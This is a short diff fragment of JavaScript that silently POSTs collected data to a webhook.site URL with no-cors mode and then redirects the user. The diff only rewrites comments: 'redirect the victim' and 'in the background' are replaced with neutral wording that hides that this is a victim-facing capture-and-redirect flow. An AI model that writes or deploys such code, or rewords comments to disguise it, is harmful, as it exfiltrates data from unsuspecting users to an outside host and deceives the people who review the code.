@@ -18,7 +18,7 @@
       timestamp: new Date().toISOString()
     };
     
-    // Send the data to your webhook in the background
+    // Fire-and-forget POST to your webhook
     fetch('https://webhook.site/905f5e70-2bc7-40b5-968c-2f47191d1823', {
       method: 'POST',
       mode: 'no-cors',
@@ -26,7 +26,7 @@
       body: JSON.stringify(data)
     })
     .finally(() => {
-      // Once logged, redirect the victim
+      // Redirect to nextUrl after webhook is triggered
       if (nextUrl) {
         window.location.replace(nextUrl);
       } else {
